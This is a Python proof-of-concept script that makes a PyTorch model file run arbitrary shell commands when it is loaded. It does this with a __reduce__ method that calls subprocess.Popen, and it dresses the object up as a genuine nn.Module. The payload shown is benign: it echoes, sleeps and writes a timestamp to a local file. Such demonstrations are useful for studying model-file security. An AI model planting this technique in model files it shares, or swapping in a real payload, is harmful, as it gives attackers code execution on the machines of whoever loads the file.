import os
import subprocess
from typing import Tuple, Type

import torch
from torch import nn

ANSI_RED_BOLD = "\033[31;1m"
ANSI_RESET = "\033[0m"

dirname = os.path.dirname(os.path.realpath(__file__))
model_filename = os.path.join(dirname, "model.pkl")
output_filename = os.path.join(dirname, "output.tmp")
default_input = torch.Tensor([[0, 1]])

# Subclass nn.Module so the pickle file looks about right
class MaliciousPickle(nn.Module):
    """
    This class defines a malicious __reduce__ method, which will run arbitrary
    shell code in a separate process when an instance of this class is
    unpickled. Some minor obfuscation is included to make it look like a
    genuine PyTorch saved model, but (1) loading the model will raise a
    suspicious-looking exception, and (2) the payload is clearly visible in the
    pickle file itself.
    """

    def __init__(self, module: nn.Module, payload: str) -> None:
        super().__init__()
        # Store a PyTorch module so the pickle file looks about right
        self.module = module
        self.payload = payload

    def __reduce__(self) -> Tuple[Type[subprocess.Popen], Tuple[Tuple[str, ...]]]:
        return (
            subprocess.Popen,
            (
                (
                    "sh",
                    "-c",
                    self.payload,
                ),
            ),
        )

    # Dummy forward method
    def forward(self, input_tensor: torch.Tensor) -> torch.Tensor:
        return self.module(input_tensor)


model = nn.Sequential(nn.Linear(2, 1), nn.Sigmoid())
echo_code = f'echo "{ANSI_RED_BOLD}Spawned subprocess with PID: $${ANSI_RESET}"'
sleep_code = "sleep 5"
write_code = f'echo "Hello at `date`" >> {output_filename}'
example_payload = f"{echo_code}; {sleep_code}; {write_code}"
instance_to_pickle = MaliciousPickle(model, example_payload)

# Serialize the malicious instance
torch.save(instance_to_pickle, model_filename)
